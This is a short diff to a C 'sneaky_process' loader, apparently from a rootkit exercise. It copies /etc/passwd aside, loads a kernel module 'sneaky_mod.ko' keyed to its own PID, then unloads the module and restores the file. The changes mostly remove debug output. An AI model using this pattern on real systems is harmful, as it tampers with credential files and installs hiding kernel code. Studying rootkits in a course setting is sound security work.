@@ -16,7 +16,7 @@ void copyFile(const char *src, const char *dest)
     // read each line from src and write into dest
     while ((n_bytes = getline(&line_buffer, &size, s)) != -1)
     {
-        printf("line: %s\n", line_buffer);
+      //printf("line: %s\n", line_buffer);
         fwrite(line_buffer, n_bytes, 1, d);
     }
 
@@ -34,21 +34,16 @@ int main(void)
     int sneaky_pid = getpid();
     printf("sneaky_process pid = %d\n", sneaky_pid);
 
-    // Copy /etc/passwd into /tmp/passwd (TODO: replace files)
+    // Copy /etc/passwd into /tmp/passwd
     copyFile("/etc/passwd", "/tmp/passwd");
 
     char load_module[100];
-    sprintf(load_module, "insmod sneaky_mod.ko sneaky_process_pid=%d", sneaky_pid);
-    // printf("Checking dir\n");
-    // system("dir");
-    // printf("load module sys call: %s\n", load_module);
+    sprintf(load_module, "insmod sneaky_mod.ko sneaky_pid=%d", sneaky_pid);
     system(load_module);
 
     // read from stdin until q
-    printf("entering while loop\n");
     while (1)
     {
-        printf("Inside while loop\n");
         char c = getchar();
         if (c == 'q')
         {
@@ -59,5 +54,6 @@ int main(void)
     const char *unload_cmd = "rmmod sneaky_mod.ko";
     system(unload_cmd);
     copyFile("/tmp/passwd", "/etc/passwd");
+    system("rm /tmp/passwd");
     return EXIT_SUCCESS;
 }
